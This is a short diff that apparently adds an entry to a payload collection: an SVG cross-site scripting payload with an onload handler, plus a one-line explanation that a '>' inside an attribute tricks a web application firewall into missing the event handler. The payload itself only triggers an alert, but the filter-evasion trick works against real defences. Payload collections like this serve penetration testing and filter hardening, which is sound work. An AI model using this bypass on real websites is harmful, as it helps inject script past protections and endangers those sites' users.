@@ -1,0 +1,3 @@
+<svg x=">" onload=alert(1)> 
+```
+(the "**>**" makes WAF thinks its the end of the tag so he doesnt block the onload event handler)
